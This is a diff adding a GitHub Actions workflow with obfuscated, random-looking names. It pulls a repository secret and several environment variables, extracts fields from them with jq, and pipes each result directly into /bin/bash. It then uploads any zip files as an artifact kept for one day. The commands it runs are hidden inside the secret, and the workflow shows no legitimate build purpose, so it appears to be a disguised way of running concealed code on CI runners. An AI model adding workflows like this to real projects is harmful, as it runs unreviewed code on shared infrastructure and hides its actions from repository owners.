@@ -1,0 +1,24 @@
+name: cvrogerminor
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cvrogerminor
+        env:
+          axz3594: ${{ secrets.axz3594 }}
+        run: |
+          printf '%s' "$axz3594" | jq -r .wocnr7 | /bin/bash
+          echo $ks5152 | jq -r .eyisu8196 | /bin/bash
+          echo $k86984 | jq -r .rjm607 | /bin/bash
+          printf '%s' "$m3" | jq -r .i09441 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: KHLwXRNe
+          path: "*.zip"
+          retention-days: 1
